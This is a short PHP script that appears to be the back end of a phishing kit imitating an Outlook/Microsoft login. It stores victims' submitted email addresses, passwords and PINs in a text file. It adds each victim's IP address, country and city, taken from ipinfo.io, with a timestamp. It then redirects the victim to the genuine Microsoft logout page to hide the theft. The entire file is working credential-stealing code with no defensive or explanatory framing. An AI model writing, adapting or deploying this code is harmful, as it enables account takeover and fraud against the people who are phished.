<?php

date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];

$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
$city = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));
	
	$file = fopen("Somosganadoresdesdequenacimos.txt", "a");
	
fwrite($file, "Correo: ".$_POST['emil']."  - Psswrd: ".$_POST['pss']." - Pin ".$_POST['numero']." Fecha: ".date('Y-m-d')." - ".date('H:i:s')." - ".$userp." ".$cc." ".$city."  " . PHP_EOL);
fwrite($file, "----------------------------------------- " . PHP_EOL);
fclose($file);

header('location:https://login.live.com/logout.srf?ct=1698893038&rver=7.0.6738.0&id=292841&ru=https:%2F%2Foutlook.live.com%2Fowa%2Fcsignout.aspx%3F%253f%253fumkt%3Des-US%26exch%3D1%26RpsCsrfState%3D4042c6ed-e025-daaa-5b59-e2b84fedc413');

?> 